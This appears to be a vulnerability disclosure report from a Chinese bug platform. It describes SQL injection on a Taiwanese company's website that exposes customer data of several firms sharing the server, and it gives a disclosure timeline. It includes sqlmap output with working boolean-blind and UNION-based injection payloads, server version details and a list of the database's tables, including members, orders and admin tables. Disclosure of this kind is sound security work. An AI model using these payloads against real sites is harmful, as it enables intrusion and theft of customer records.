wybug_title: 发朵有限公司主站SQL注入（影响同ip其他公司+客户资料泄露）（臺灣地區）
wybug_status: 已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-14：	细节已通知厂商并且等待厂商处理中									2015-12-15：	厂商已经确认，细节仅向厂商公开									2015-12-25：	细节向核心白帽子及相关领域专家公开									2016-01-04：	细节向普通白帽子公开									2016-01-14：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述： 法朵有限公司鼎珍食品文雄眼镜等多家公司客户信息泄露 详细说明：  注入点：http://**.**.**.**/index.php?option=mainmenu&task=showpage&id=11 
sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: option=mainmenu&task=showpage&id=11 AND 5479=5479    Type: UNION query    Title: MySQL UNION query (73) - 15 columns    Payload: option=mainmenu&task=showpage&id=-7256 UNION ALL SELECT 73,73,73,73,73,73,73,73,73,CONCAT(0x7176717071,0x5442556b464f716b4f65516453444c4b71677a6d596a7748457776496b45765179735a664e546f50,0x71707a7071),73,73,73,73,73#---[22:10:38] [INFO] the back-end DBMS is MySQLweb server operating system: FreeBSD 9.2web application technology: Apache 2.4.6, PHP 5.4.19back-end DBMS: MySQL 5Database: valoisdb[26 tables]+---------------+| actionlogs    || adminmanagers || advlinks      || advrolls      || advs          || allproducts   || articles      || downmenus     || faqs          || indexconf     || leftmenus     || logs          || mailcnt       || mainmenus     || members       || news          || newsletters   || orderdtl      || orders        || payconf       || products      || provars       || rightmenus    || siteinfo      || syscode       || sysconf       |+---------------+
